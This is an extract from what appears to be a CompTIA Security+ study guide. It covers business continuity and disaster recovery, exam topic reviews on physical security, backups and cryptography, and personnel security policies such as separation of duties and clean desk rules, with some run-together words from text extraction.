The recovery time objective (RTO) identifies the maximum amount of time it can take to restore a system after an outage. Many BIAs identify the
 maximum acceptable outage or maximum tolerable outage time for mission- essential functions and critical systems. If an outage lasts longer than this maximum time, the impact is unacceptable to the organization.
example, imagine an organization that sells products via a web site generates $10,000 in revenue an hour. It might decide that the maximum acceptable outage for the web server is five minutes. This results in an RTO of five minutes, indicating any outage must be limited to less than five minutes. This RTO of five minutes only applies to the mission-essential function of online sales and the critical systems supporting it.
Imagine that the organization has a database server only used by internal employees, not online sales. Although the database server may be valuable, it is not critical. Management might decide they can accept an outage for as long as 24 hours, resulting in an RTO of less than 24 hours.
Recovery Point Objective
A recovery point objective (RPO) identifies a point in time where data loss is acceptable. example, a server may host archived data that has very few changes on a weekly basis. Management might decide that some data loss is acceptable, but they always want to be able to recover data from at least the previous week. In this case, the RPO is one week.
With an RPO of one week, administrators would ensure that they have at least weekly backups. In the event of a failure, they will be able to restore recent backups and meet the RPO. In some cases, the RPO is up to the minute of the failure. example, any data loss from an online database recording customer transactions might be unacceptable. In this case, the organization can use a variety of techniques to
ensure administrators can restore data up to the moment of failure.
Comparing MTBF and MTTR
When working with a BIA, experts often attempt to predict the possibility of a failure.  example, what is the likelihood that a hard disk within a RAID configuration will fail? The following two terms are often used to predict potential failures:
Mean time between failures (MTBF). The mean time between failures (MTBF) provides a measure of a system’s reliability and is usually represented in hours. More specifically, the MTBF identifies the average (the arithmetic mean) time between failures. Higher MTBF numbers indicate a higher reliability of a product or system. Administrators and security experts attempt to identify the MTBF for critical systems with a goal of predicting potential outages.
Mean time to recover (MTTR). The mean time to recover (MTTR) identifies the average (the arithmetic mean) time it takes to restore a failed system. In some cases, people interpret MTTR as the mean time to repair, and both mean essentially the same thing. Organizations that have maintenance contracts often specify the MTTR as a part of the contract. The supplier agrees that it will, on average, restore a failed system within the MTTR time. The MTTR does not provide a guarantee that it will restore the system within the MTTR every time. Sometimes, it might take a little longer and sometimes it might be a little quicker, with the average defined by the MTTR.
Continuity of Operations Planning
Continuity of operations planning focuses on restoring mission- essential functions at a recovery site after a critical outage. example, if a hurricane or other disaster prevents the company from operating in the primary location, the organization can continue to operate the mission- essential functions at an alternate location that management previously identified as a recovery site. Failover is the process of moving mission-
essential functions to the alternate site.
Recovery Sites A recovery site is an alternate processing site that an organization can use after a disaster. The three primary types of recovery sites are hot sites, cold sites, and warm sites. These alternate locations could be office space within a building, an entire building, or even a group of buildings. Two other types of recovery sites are mobile sites and mirrored sites. The following sections provide more details on these sites.
Hot Site
A hot site would be up and operational 24 hours a day, seven days a week and would be able to take over functionality from the primary site quickly after a primary site failure. It would include all the equipment, software, and communication capabilities of the primary site, and all the data would be up to date. In many cases, copies of backup tapes are stored at the hot site as the off-site location.
In many cases, a hot site is another active business location that has the capability to
assume operations during a disaster. example, a financial institution could have locations in two separate cities. The second location provides noncritical support services, but also includes all the resources necessary to assume the functions of the first location.
Some definitions of hot sites indicate they can take over instantaneously, though this isn’t consistent. In most cases, it takes a little bit of time to transfer operations to the hot site, and this can take anywhere from a few minutes to an hour.
Clearly, a hot site is the most effective disaster recovery solution for high- availability requirements. If an organization must keep critical systems with high-availability requirements, the hot site is the best choice. However, a hot site is the most expensive to maintain and keep up to date.
Cold Site
 A cold site requires power and connectivity but not much else. Generally, if it has a roof, electricity, running water, and Internet access, you’re good to go. The organization brings all the equipment, software, and data to the site when it activates it.
I often take my dogs for a walk at a local army base and occasionally see soldiers activate an extreme example of a cold site. On most weekends, the fields are empty. Other weekends, soldiers have transformed one or more fields into complete operational sites with tents, antennas, cables, generators, and porta-potties.
Because the army has several buildings on the base, they don’t need to operate in the middle of fields, but what they’re really doing is testing their ability to stand up a cold site wherever they want. If they can do it in the field, they can do it in the middle of a desert, or anywhere else they need to.
A cold site is the cheapest to maintain, but it is also the most difficult to test.
Warm Site
You can think of a warm site as the Goldilocks solution—not too hot and not too cold, but just right. Hot sites are generally too expensive for most organizations, and cold sites sometimes take too long to configure for full operation. However, the warm site provides a compromise that an organization can tailor to meet its needs.
example, an organization can place all the necessary hardware at the warm site location but not include up-to-date data. If a disaster occurs, the organization can copy the data to the warm site and take over operations. This is only one example, but there are many different possibilities of warm site configurations.
Site Variations
Although hot, cold, and warm sites are the most common, you might also come across two additional alternate site types: mobile and mirrored.
Amobilesiteisaself- containedtransportableunitwithalltheequipmentneededforspecific requirements. example, you can outfit a semitrailer with everything needed for operations, including a satellite dish for connectivity. Trucks, trains, or ships haul it to its destination and it only needs power to start operating.  Mirrored sites are identical to the primary location and provide 100 percent availability. They use real-time transfers to send modifications from the primary location to the mirrored site. Although a hot site can be up and operational within an hour, the mirrored site is always up and operational.
Order of Restoration
After the disaster has passed, you will want to return all the functions to the primarysite.Asabestpractice,organizationsreturntheleastcriticalfunctions to the primary site first. Remember, the critical functions are operational at the alternate site and can stay there as long as necessary. If a site has just gone through a disaster, it’s very likely that there are still some unknown problems. By moving the least critical functions first, undiscovered problems will appear and can
be resolved without significantly affecting mission-essential functions.
Disaster Recovery
Disaster recovery is a part of an overall business continuity plan. Often, the organization will use the business impact analysis to identify the critical systems and components and then develop disaster recovery strategies and disaster recovery plans (DRPs) to address the systems hosting these functions.
In some cases, an organization will have multiple DRPs within a BCP, and in other cases, the organization will have a single DRP. example, it’s
possible to have individual DRPs that identify the steps to recover individual critical servers and other DRPs that detail the recovery steps after different types of disasters such as hurricanes or tornadoes. A smaller organization might have a single DRP that simply identifies all the steps used to respond to any disruption.
A DRP or a BCP will include a hierarchical list of critical systems. This list identifies what systems to restore after a disaster and in what order. example, should a server hosting an online web site be restored first, or a server hosting an internal application? The answer is dependent on how the organization values and uses these servers. In some cases, systems have interdependencies requiring systems to be restored in a certain order.
If the DRP doesn’t prioritize the systems, individuals restoring the systems will use their own judgment, which might not meet the overall needs of the organization. example, Nicky New Guy might not realize that a web server is generating $5,000 an hour in revenue but does know that he’s responsible for keeping a generic file server operational. Without an ordered list of critical systems, he might spend his time restoring the file server and not the web server.
This hierarchical list is valuable when using alternate sites such as warm or cold sites,too.
When the organization needs to move operations to an alternate site, the organization will want the most important systems and functions restored first.
Similarly, the DRP often prioritizes the services to restore after an outage. As a rule, critical business functions and security services are restored first. Support services are restored last.
The different phases of a disaster recovery process typically include the following steps:
Activate the disaster recovery plan. Some disasters, such as earthquakes or tornadoes, occur without much warning, and a disaster recovery plan is activated after the disaster. Other disasters, such as hurricanes, provide a warning, and the plan is activated when the disaster is imminent.
Implement contingencies. If the recovery plan requires implementation of an alternate site, critical functions are moved to these sites. If the disaster destroyed on-site backups, this step retrieves the off- site backups from the off-site location.
Recover critical systems. After the disaster has passed, the organization begins recovering critical systems. The DRP documents which
systems to recover and includes detailedstepsonhowtoreconverthem.Thisalsoincludesreviewingchangema documentation to ensure that recovered systems include approved changes.
Test recovered systems. Before bringing systems online, administrators test and verify them. This may include comparing the restored system with a performance baseline to verify functionality. After-action report. The final phase of disaster recovery includes a review of the disaster, sometimes called an after-action review. This often includes a lessons learned review to identify what went right and what went wrong. After reviewing the after-action report, the organization often updates the plan to incorporate any lessons learned.
Testing Plans with Exercises
Business continuity plans and disaster recovery plans include testing. Testing validates that the plan works as desired and will often include testing redundancies and backups. There are several different types of testing used with BCPs and DRPs.
NIST SP 800-34, “Guide to Test, Training, and Exercise Programs for IT Plans and Capabilities,” provides detailed guidance on testing BCP and DRP plans. SP 800-34 identifies two primary types of exercises: tabletop exercises and functional exercises.
A tabletop exercise (also called a desktop exercise or a structured walk- through) is discussion-based. A coordinator gathers participants in a classroom or conference room, and leads them through one or more scenarios. As the coordinator introduces each stage of an incident, the participants identify what they’ll do based on the plan. This generates discussion about team members’ roles and responsibilities and the decision- making process during an incident. Ideally, this validates that the plan is valid. However, it sometimes reveals flaws. The BCP coordinator ensures the plans are rewritten if necessary.
Functional exercises provide personnel with an opportunity to test the plans in a simulated operational environment. There is a wide range of functional exercises, from simple simulations to full-blown tests. In a simulation, the participants go through the steps in a controlled manner without affecting the actual system. example, a simulation can start by indicating that a
 server failed. Participants then follow the steps to rebuild the server on a test system. A full- blown test goes through all the steps of the plan. In addition to verifying that the test works, this also shows the amount of time it will take to execute the plan.
Some of the common elements of testing include:
Backups. Backups are tested by restoring the data from the backup, as
discussed in the “Testing Backups” section earlier in this chapter.
Server restoration. A simple disaster recovery exercise rebuilds a server. Participants follow the steps to rebuild a server using a test system without touching the live system.
Server redundancy. If a server is within a failover cluster, you can test the cluster by taking a primary node offline. Another node within the cluster should automatically assume the role of this offline node.
Alternate sites. You can test an alternate site (hot, cold, or warm) by moving some of the functionality to the alternate site and ensuring the alternate site works as desired. It’s also possible to test individual elements of an alternate site, such as Internet connectivity, or the ability to obtain and restore backup media.
Chapter 9 Exam Topic Review
When preparing for the exam, make sure you understand these key concepts covered in this chapter.
Implementing Defense in Depth
Layered security (or defense in depth) employs multiple layers of
security to protect against threats. Personnel constantly monitor, update, add to, and improve existing security controls.
Control diversity is the use of different security control types, such as technical controls, administrative controls, and physical controls.
Vendor diversity is the practice of implementing security controls from different vendors to increase security.
 Comparing Physical Security Controls
Physical security controls are controls you can physically touch. They often control entry and exit points, and include various types of locks. An airgap is a physical security control that ensures that a computer or network is physically isolated from another computer or network.
Controlled areas such as data centers and server rooms should only have a single
entrance and exit point. Door lock types include cipher locks, proximity cards, and biometrics.
A proximity card can electronically unlock a door and helps prevent unauthorized personnel from entering a secure area. By themselves, proximity cards do not identify and authenticate users. Some systems combine proximity cards with PINs for identification and authentication.
Tailgating occurs when one user follows closely behind another user without using credentials. A mantrap can prevent tailgating.
Security guards are a preventive physical security control and they can prevent unauthorized personnel from entering a secure area. A benefit of guards is that they can recognize people and compare an individual’s picture ID for people they don’trecognize.
Cameras and closed-circuit television (CCTV) systems provide video surveillance. They provide reliable proof of a person’s identity and activity.
Fencing, lighting, and alarms are commonly implemented with motion detection systems for physical security. Infrared motion detection systems detect human activity based on the temperature.
Barricades provide stronger physical security than fences and attempt to deter attackers. Bollards are effective barricades that allow people through, but block vehicles.
Cable locks secure mobile computers such as laptop computers in a training lab. Server bays include locking cabinets or enclosures within a server room. Small devices can be stored in safes or locking office cabinets to prevent the theft of unused resources.
Asset management processes protect against vulnerabilities related to architecture and design weaknesses, system sprawl, and undocumented assets.
Heating, ventilation, and air conditioning (HVAC) systems control airflow for data centers and server rooms. Temperature controls protect systems from damage due to overheating.
Hot and cold aisles provide more efficient cooling of systems within a data center.
EMI shielding prevents problems from EMI sources such as
fluorescent lighting fixtures. It also prevents data loss in twisted-pair cables. A Faraday cage prevents signals from emanating beyond a room or enclosure.
Adding Redundancy and Fault Tolerance
A single point of failure is any component that can cause the entire system to fail if itfails.
RAID disk subsystems provide fault tolerance and increase availability. RAID-1 (mirroring) uses two disks. RAID-5 uses three or more disks and can survive the failure of one disk. RAID-6 and RAID-10 use four or more disks and can survive the failure of two disks.
Load balancers spread the processing load over multiple servers. In an active- active configuration, all servers are actively processing requests. In an active-passive configuration, at least one server is not active, but is instead monitoring activity ready to take over for a failed server. Software-based load balancers use a virtual IP.
Affinity scheduling sends client requests to the same server based on the client’s IP address. This is useful when clients need to access the same server for an entire online session. Round-robin scheduling sends requests to servers using a predefined order.
Protecting Data with Backups
Backup strategies include full, full/differential, full/incremental, and snapshot strategies. A full backup strategy alone allows the quickest recovery time.
Full/incremental backup strategies minimize the amount of time needed to perform dailybackups.
Test restores verify the integrity of backups. A test restore of a full backup verifies a backup can be restored in its entirety. Backups should be labeled to identify the contents. A copy of backups should be kept off-site.
It’s important to consider the distance between the main site and the off-site location.
The data contained in the backups can have legal implications. If it includes Personally Identifiable Information (PII) or Protected Health Information (PHI), it must be protected according to governing laws.
The location of the data backups affects the data sovereignty. If backups are stored in a different country, the data on the backups is now subject to the laws and regulations ofthat country.
Comparing Business Continuity Elements
A business impact analysis (BIA) is part of a business continuity plan (BCP) and it identifies mission-essential functions, critical systems, and vulnerable business processes that are essential to the organization’s success.
The BIA identifies maximum downtimes for these systems and components. It considers various scenarios that can affect these systems and components, and the impact to life, property, safety, finance, and reputation from an incident.
A privacy threshold assessment identifies if a system processes data that exceeds the threshold for PII. If the system processes PII, a privacy impact assessment helps identify and reduce risks related to potential loss of the PII.
A recovery time objective (RTO) identifies the maximum amount of time it should take to restore a system after an outage. The recovery point objective (RPO) refers to the amount of data you can afford to
lose.
Mean time between failures (MTBF) identifies the average (the arithmetic mean) time between failures. The mean time to recover (MTTR) identifies the average (the arithmetic mean) time it takes to restore a failed system.
Continuity of operations planning identifies alternate processing sites and alternate business practices. Recovery sites provide alternate locations for business functions after a major disaster.
A hot site includes everything needed to be operational within 60 minutes. It is the most effective recovery solution and the most ▪


## expensive. A cold site has power and connectivity requirements and little else. It is the least expensive to maintain. Warm sites are a compromise between hot sites and cold sites.
Periodic testing validates continuity of operations plans. Exercises validate the steps to restore individual systems, activate alternate sites, and document other actions within a plan. Tabletop exercises are discussion-based only. Functional exercises are hands-on exercises.
Online References
Do you know how to answer performance-based questions? Check out the online extras athttp://gcgapremium.com/501-extras.
Chapter 10 Exam Topic Review
When preparing for the exam, make sure you understand these key concepts covered in this chapter.
Introducing Cryptography Concepts
Integrity provides assurances that data has not been modified. Hashing ensures that data has retained integrity.
Confidentiality ensures that data is only viewable by authorized users. Encryption protects the confidentiality of data.
- Symmetric encryption uses the same key to encrypt and decrypt data.
- Asymmetric encryption uses two keys (public and private) created as a
matched pair.
- Adigitalsignatureprovidesauthentication,non-repudiation,and integrity.
- Authentication validates an identity.
   ▪


## - Non-repudiation prevents a party from denying an action.
- Users sign emails with a digital signature, which is a hash of an email
message encrypted with the sender’s private key.
- Only the sender’s public key can decrypt the hash, providing verification it was encrypted with the sender’s private key.
Providing Integrity with Hashing
Hashing verifies the integrity of data, such as downloaded filesand email messages.
- A hash (sometimes listed as a checksum) is a fixed-size string of numbers or hexadecimal characters.
- Hashingalgorithmsareone-wayfunctionsusedtocreateahash.Youcannot reverse the process to re-create the original data.
- Passwords are often stored as hashes instead of the actual password. Salting the password thwarts many password attacks.
▪
- Common hashing algorithms are Message Digest 5 (MD5), Secure Hash Algorithm(SHA),andHash-basedMessageAuthenticationCode (HMAC).
- HMAC provides both integrity and authenticity of a message. Providing Confidentiality with Encryption
Confidentiality ensures that data is only viewable by authorized users.
- Encryption provides confidentiality of data, including data-at-rest (any type
of data stored on disk) or data-in-transit (any type of transmitted data).
- Block ciphers encrypt data in fixed-size blocks. Advanced Encryption
Standard (AES) and Twofish encrypt data in 128-bit blocks.
- Stream ciphers encrypt data 1 bit or 1 byte at a time. They are more efficient
than block ciphers when encrypting data of an unknown size or when sent in a
  Two commonly used key stretching techniques are bcrypt and Password-
Based Key Derivation Function 2 (PBKDF2). They protect passwords against brute force and rainbow table attacks.
 continuous stream. RC4 is a commonly used stream cipher.
- Cipher modes include Electronic Codebook (ECB), Cipher Block Chaining
(CBC), Counter (CTM) mode, and Galois/Counter Mode (GCM).
  - ECB should not be used.
  - GCM is widely used because it is efficient and provides data authenticity.
- Data Encryption Standard (DES), Triple DES (3DES), and Blowfish are block ciphers that encrypt data in 64-bit blocks. AES is a popular symmetric block encryption algorithm, and it uses 128, 192, or 256 bits for the key.
- Asymmetric encryption uses public and private keys as matched pairs.
- If the public key encrypted information, only the matching private key can
decrypt it.
- If the private key encrypted information, only the matching public key can decrypt it.
- Private keys are always kept private and nevershared.
- Public keys are freely shared by embedding them in a certificate.
- RSA is a popular asymmetric algorithm. Many cryptographic protocols use RSA to secure data such as email and data transmitted over the Internet. RSA uses prime numbers to generate public and private keys.
- Elliptic curve cryptography (ECC) is an encryption technology commonly used with small wireless devices.
- Diffie-Hellman provides a method to privately share a symmetric key between two parties. Elliptic Curve Diffie-Hellman Ephemeral (ECDHE) is a version of Diffie-Hellman that uses ECC to re-create keys for each session.
- Steganography is the practice of hiding data within a file. You can hide messages in the white space of a file without modifying its size. A more sophisticated method is by modifying bits within a file. Capturing and comparing hashes of files can discover steganography attempts.
Using Cryptographic Protocols ▪


##  When using digital signatures with email: The sender’s private key encrypts (or signs). The sender’s public key decrypts.
- A digital signature provides authentication (verified identification) of the sender, non- repudiation, and integrity of the message.
- Senders create a digital signature by hashing a message and encrypting the hash with the sender’s private key.
- Recipientsdecryptthedigitalsignaturewith thesender’s matching publickey.
- When encrypting email: The recipient’s public key encrypts. The recipient’s private key decrypts.
- Many email applications use the public key to encrypt a symmetric key, and then use the symmetric key to encrypt the email contents.
- S/MIME and PGP secure email with encryption and digital signatures. They both use RSA, certificates, and depend on a PKI. They can encrypt email at rest (stored on a drive) and in transit (sent over the network).
- TLS is the replacement for SSL. SSL is deprecated and should not be used.
- When encrypting web site traffic with TLS: The web site’s public key encrypts a symmetric key. The web site’s private key decrypts the symmetric key. The symmetric key encrypts data in the session.
- Weak cipher suites (such as those supporting SSL) should be disabled to prevent downgrade attacks.
Exploring PKI Components
A Public Key Infrastructure (PKI) is a group of technologies used to request, create, manage, store, distribute, and revoke digital certificates. A PKI
allows two entities to privately share symmetric keys without any prior communication.
- Most public CAs use a hierarchical centralized CA trust model, with a root CA and intermediate CAs. A CA issues, manages, validates, and revokes certificates.
- Root certificates of trusted CAs are stored on computers. If a CA’s root certificate is not in the trusted store, web users will see errors indicating
 the certificate is not trusted or the CA is not recognized.
- You request a certificate with a certificate signing request (CSR). You first create a private/ public key pair and include the public key in the CSR.
- CAs revoke certificates when an employee leaves, the private key is compromised, or the CA is compromised. A CRL identifies revoked certificates as a list of serial numbers.
- The CA publishes the CRL, making it available to anyone. Web browsers can check certificates they receive from a web server against a copy of the CRL to determine if a received certificate is revoked.
- Public key pinning provides clients with a list of hashes for each public key it uses.
- Certificate stapling provides clients with a timestamped, digitally signed OCSP response. This is from the CA and appended to the certificate.
- User systems return errors when a system tries to use an expired certificate.
- A key escrow stores a copy of private keys used within a PKI. If the original private key is lost or inaccessible, the copy is retrieved from escrow, preventing data loss.
- Wildcard certificates use a * for child domains to reduce the administrative burden of managing certificates. Subject Alternative Name (SAN) certificates can be used for multiple domains with different domain names.
- A domain validated certificate indicates that the certificate requestor has some control over a DNS domain.
- Extended validation certificates use additional steps beyond domain validation to give users a visual indication that they are accessing the site.
- CER is a binary format for certificates and DER is an ASCII format.
- PEM is the most commonly used certificate format and can be used for just
about any certificate type.
- P7B certificates are commonly used to share public keys.
- P12 and PFX certificates are commonly used to hold the private key. Chapter 11 Implementing Policies to Mitigate Risks
CompTIA Security+ objectives covered in this chapter:
2.2 Given a scenario, use appropriate software tools to assess the security posture of an organization.
Data sanitization tools
2.3 Given a scenario, troubleshoot common security issues.
Personnel issues (Policy violation, Personal email)
4.4 Given a scenario, differentiate common account management practices.
General Concepts (Onboarding/offboarding)
5.1 Explain the importance of policies, plans and procedures related to organizational security. Standard operating procedure, Agreement types (BPA, SLA, ISA, MOU/MOA), Personnel management (Mandatory vacations, Job rotation, Separation of duties, Clean desk, Background checks, Exit interviews, Role-based awareness training [Data owner, System administrator, System owner, User, Privileged user, Executive user], NDA, Onboarding, Continuing education, Acceptable use policy/rules of behavior, Adverse actions), General security policies (Social media networks/applications, Personal email)
5.4 Given a scenario, follow incident response procedures.
Incident response plan (Documented incident types/category definitions, Roles and responsibilities, Reporting requirements/escalation, Cyber-incident response
teams, Exercise), Incident response process (Preparation, Identification, Containment, Eradication, Recovery, Lessons learned)
5.5 Summarize basic concepts of forensics.
Order of volatility, Chain of custody, Legal hold, Data acquisition (Capture system image, Network traffic and logs, Capture video, Record time offset, Take hashes, Screenshots, Witness interviews), Preservation, Recovery, Strategic intelligence/counterintelligence gathering (Active logging), Track man-hours
5.8 Given a scenario, carry out data security and privacy practices.
Data destruction and media sanitization (Burning, Shredding, Pulping, Pulverizing, Degaussing, Purging, Wiping), Data sensitivity labeling and handling (Confidential, Private, Public, Proprietary, PII, PHI), Data roles (Owner, Steward/custodian, Privacy officer), Data retention, Legal and compliance
**
Organizations often develop written security policies. These provide guiding principles to the professionals who implement security throughout the organization. These policies include personnel management policies and data protection policies. Combined with training for personnel to raise overall security awareness, they help mitigate risk and reduce security incidents. However, security incidents still occur, and incident response policies provide the direction on how to handle them.
Exploring Security Policies
Security policies are written documents that lay out a security plan within a company. They are one of many administrative controls used to reduce and manage risk. When created early enough, they help ensure that personnel consider and implement security throughout the life cycle of various systems in the company. When the policies and procedures are enforced, they help prevent incidents, data loss, and theft.
Policies include brief, high-level statements that identify goals based on an organization’s overall beliefs and principles. After creating the policy, personnel within the organization create plans and procedures to support the policies. Although the policies are often high-level statements, the plans and procedures provide details on policy implementation.
example, organizations often create standard operating procedures (SOPs) to support security policies. These typically include step- by-step instructions employees can use to perform common tasks or routine operations. Security controls such as those covered in Chapter 1, “Mastering Security Basics,” enforce the requirements of a security policy. example, a security policy may state that internal users must not use peer-to-peer (P2P)
applications. A firewall with appropriate rules to block these applications provides a technical implementation of this policy. Similarly, administrators can use port-scanning tools to detect applications running on internal systems that are violating the security policy.
A security policy can be a single large document or divided into several smaller documents, depending on the needs of the company. The following sections identify many of the common elements of a security policy.
Personnel Management Policies
Companies frequently develop policies to specifically define and clarify issues related to personnel management. This includes personnel behavior, expectations, and possible consequences. Personnel learn these policies when they are hired and as changes occur. Some of the policies directly related to personnel are acceptable use, mandatory vacations, separation of duties, job rotation, and clean desk policies. The following sections cover these and other personnel policies in more depth.
Acceptable Use Policy
An acceptable use policy (AUP) defines proper system usage or the rules of behavior for employees when using information technology (IT) systems. It often describes the purpose of computer systems and networks, how users can access them, and the responsibilities of users when they access the systems.
Many organizations monitor user activities, such as what web sites they visit and what data they send out via email. example, a proxy server typically logs all web sites that a user visits. The AUP may include statements informing users that systems are in place monitoring their activities.
In some cases, the AUP might include privacy statements informing users what computer activities they can consider private. Many users have an expectation of privacy when using an organization’s computer systems and networks that isn’t justified. The privacy policy statement helps to clarify the organization’s stance.
The AUP often includes definitions and examples of unacceptable use. example, it might prohibit employees from using company resources to access P2P sites or social media sites.
I t ’s common for organizations to require users to read and sign a document indicating they understand the acceptable use policy when they’re hired and in conjunction with annual security training. Other methods, such as logon banners or periodic emails, help reinforce an acceptable use policy.
Mandatory Vacations
Mandatory vacation policies help detect when employees are involved in malicious activity, such as fraud or embezzlement. example, employees in positions of fiscal trust, such as stock traders or bank employees, are often required to take an annual vacation of at least five consecutive workdays.
For embezzlement actions of any substantial size to succeed, an employee would need to be constantly present in order to manipulate records and respond to different inquiries. On the other hand, if an employee is forced to be absent for at least five consecutive workdays, someone else would be required to answer any queries during the employee’s absence. This increases the likelihood of discovering illegal activities by employees. It also acts as an effective deterrent. Mandatory vacations aren’t limited to only financial institutions, though. Many organizations require similar policies for administrators. example, an administrator might be the only person required to perform sensitive activities such as reviewing certain logs. A malicious administrator can overlook or cover up certain activities revealed in the logs. However, a mandatory vacation policy would require someone else to perform these activities, which increases the chance of discovery.
Of course, mandatory vacations by themselves won’t prevent fraud. Most companies will implement the principle of defense in depth by using multiple layers of protection. Additional policies may include separation of duties and job rotation to provide as much protection as possible.
Separation of Duties
Separation of duties is a principle that prevents any single person or entity from being able to complete all the functions of a critical or sensitive process. It’s designed to prevent fraud, theft, and errors.
Accounting provides a classic example. I t ’s common to divide Accounting departments into two divisions: Accounts Receivable and Accounts Payable. Personnel in the Accounts Receivable division review and validate bills. They then send the validated bills to the personnel in the Accounts Payable division, who pay the bills. Similarly, this policy would ensure personnel are not authorized to print and sign checks. Instead, a separation of duties policy separates these two functions to reduce the possibility of fraud.
If Homer were the only person doing all these functions, it would be possible for him to create and approve a bill from Homer’s Most Excellent Retirement Account. After approving the bill, Homer would then pay it. If Homer doesn’t go to jail, he may indeed retire early at the expense of the financial health of the company.
Separation of duties policies also apply to IT personnel. example, i t ’s common to separate application development tasks from application deployment tasks. In other words, developers create and modify applications and then pass the compiled code to administrators. Administrators then deploy the code to live production systems. Without this policy in place, developers might be able make quick, untested changes to code, resulting in unintended outages. This provides a high level of version control and prevents potential issues created through uncontrolled changes.
As another example, a group of IT administrators may be assigned responsibility for maintaining a group of database servers. However, they would not be granted access to security logs on these servers. Instead, security administrators regularly review these logs, but these security administrators will not have access to data within the databases.
Imagine that Bart has been working as an IT administrator but recently changed jobs and is now working as a security administrator. What should happen? Based on separation of duties, Bart should now have access to the security logs, but his access to the data within the databases should be revoked. If his permissions to the data are not revoked, he will have access to more than he needs, violating the principle of least privilege. A user rights and permissions review often discovers these types of issues.
Job Rotation
Job rotation is a concept that has employees rotate through different jobs to learn the processes and procedures in each job. From a security perspective, job rotation helps to prevent or expose dangerous shortcuts or even fraudulent activity. Employees might rotate through jobs temporarily or permanently.
example, your company could have an Accounting department. As mentioned in the “Separation of Duties” section, you would separate accounting into two divisions—Accounts Receivable and Accounts Payable. Additionally, you could rotate personnel in and out of jobs in the two divisions. This would ensure more oversight over past transactions and help ensure that employees are following rules and policies.
In contrast, imagine a single person always performs the same function without any expectation of oversight. This increases the temptation to go outside the bounds of established policies.
Job rotation policies work well together with separation of duties policies. A separation of duties policy helps prevent a single person from controlling too much. However, if an organization only used a separation of duties policy, it is possible for two people to collude in a scheme to defraud the company. If a job rotation policy is also used, these two people will not be able to continue the fraudulent activity indefinitely. Job rotation policies also apply to IT personnel. example, the policy can require administrators to swap roles on a regular basis, such as annually or quarterly. This prevents any single administrator from having too much control over a system or network.
Clean Desk Policy
A clean desk policy directs users to keep their areas organized and free of papers. The primary security goal is to reduce threats of security incidents by ensuring the protection of sensitive data. More specifically, it helps prevent the possibility of data theft or inadvertent disclosure of information.
Imagine an attacker goes into a bank and meets a loan officer. The loan officer has stacks of paper on his desk, including loan applications from various customers. If the loan officer steps out, the attacker can easily grab some of the documents, or simply take pictures of the documents with a mobile phone.
Beyond security, organizations want to present a positive image to customers and clients. Employees with cluttered desks with piles of paper can easily turn off customers.
However, a clean desk policy doesn’t just apply to employees who meet and greet customers. It also applies to employees who don’t interact with customers. Just as dumpster divers can sort through trash to gain valuable information, anyone can sort through papers on a desk to learn information. It’s best to secure all papers to keep them away from prying eyes. Some items left on a desk that can present risks include:
Keys
Cell phones
I’ll Go to Jail Before I Give You the Passwords!
The city of San Francisco had an extreme example of the dangers of a single person with too much explicit knowledge or power. A network administrator with one of Cisco’s highest certifications—Cisco Certified Internetwork Expert (CCIE)—made changes to t h e city’s network, changing passwords so that only he knew them and ensuring that he was the only person with administrative access.
It could be that he was taking these actions to protect the network that he considered his “baby.” He was the only CCIE, and it’s possible he thought others did not have the necessary knowledge to maintain the network adequately. Over the years, fewer and fewer people had access to what he was doing, and his knowledge became more and more proprietary. Instead of being malicious in nature, he might have simply been protective, even if overly protective.
At some point, his supervisor recognized that all the proverbial information eggs were in the basket of this lone CCIE. It was just too risky. What if a bus, or one of San Francisco’s famous trolleys, hit him? What would the organization do? His supervisor asked him for some passwords and he refused, even when faced with arrest. Later, he gave law enforcement personnel passwords that didn’t work.
Law enforcement personnel charged him with four counts of tampering with a computer network and courts kept him in custody with a $5 million bail. Ultimately, a court convicted him of one felony count and sentenced him to four years in prison. This is a far fall from his reported annual salary of $127,735.
The city of San Francisco had to bring in experts from Cisco and the city
reported costs of
$900,000 to regain control of their network. Following his conviction, the court also ordered the administrator to pay $1.5 million in restitution.
What’s the lesson here? Internal security controls, such as creating and enforcing policies related to rotation of duties, separation of duties, and cross-training, might h a v e been able to avoid this situation completely. If this CCIE truly did have good intentions toward what he perceived as his network, these internal controls might have prevented
him from going over the line into overprotection and looking at the world through the bars of a jail cell.
Access cards
Sensitive papers
Logged-on computer
Printouts left in printer
Passwords on Post-it notes
File cabinets left open or unlocked
Personal items such as mail with Personally Identifiable Information (PII)
Some people want to take a clean desk policy a step further by scrubbing and sanitizing desks with antibacterial cleaners and disinfectants on a daily basis. They are free to do so, but that isn’t part of a security-related clean desk policy.
Background Check
It’s common for organizations to perform background checks on potential employees and even after employees are hired. A background check checks into a potential employee’s history with the intention of discovering anything about the person that might make him a less-than- ideal fit for a job.
A background check will vary depending on job responsibilities and the sensitivity of data that person can access. example, a background check for an associate at Walmart will be significantly less than a background check for a government employee who will handle T o p Secret Sensitive Compartmented Information.
However, background checks will typically include a query to law enforcement agencies to identify a person’s criminal history. In some cases, this is only to determine if the person is a felon. In other cases, it checks for all potential criminal activity, including a review of a person’s driving records.
Many organizations check a person’s financial history by obtaining a credit report. example, someone applying for a job in an Accounting department might not be a good fit if his credit score is 350 and he has a string of unpaid loans.
It is also common for employers to check a person’s online activity. This includes social media sites, such as Facebook, LinkedIn, and Twitter. Some people say and do things online that they would rarely do in public. One reason is a phenomenon known as the online disinhibition effect. Just as a beer or glass of wine releases inhibitions in many people, individuals are often less inhibited when posting comments online. And what they post often reflects their true feelings and beliefs. Consider a person who frequently posts hateful comments about others. A potential employer might think that this person is unlikely to work cohesively in a team environment and hire someone else.
Note that some background checks require the written permission from the potential employee. example, the Fair Credit Reporting Act (FCRA) requires organizations to obtain written permission before obtaining a credit report on a job applicant or employee. However, other background checks don’t require permission. example, anyone can look at an individual’s social media profile.
NDA
A non-disclosure agreement (NDA) is used between two entities to ensure that proprietary data is not disclosed to unauthorized entities. example, imagine BizzFad wants to collaborate with Costington’s on a project. BizzFad management realizes they need to share proprietary data with Costington’s personnel, but they want to ensure that distribution of the data is limited. The NDA is a legal document that BizzFad can use to hold Costington’s legally responsible if the proprietary data is shared.
Similarly, many organizations use an NDA to prohibit employees from sharing proprietary data either while they are employed, or after they leave the organization. It’s common to remind employees of an existing NDA during an exit interview.
Exit Interview
An exit interview is conducted with departing employees just before they leave an organization. Note that an exit interview isn’t only conducted when employees are fired from their job. They are also done when employees leave voluntarily. The overall purpose is for the employer to gain information from the departing employee. Some common questions asked
during an exit interview are:
What did you like most (and/or least) about your job here?
Do you think you had adequate training to do your job here?
Can you tell me what prompted you to leave your current position?
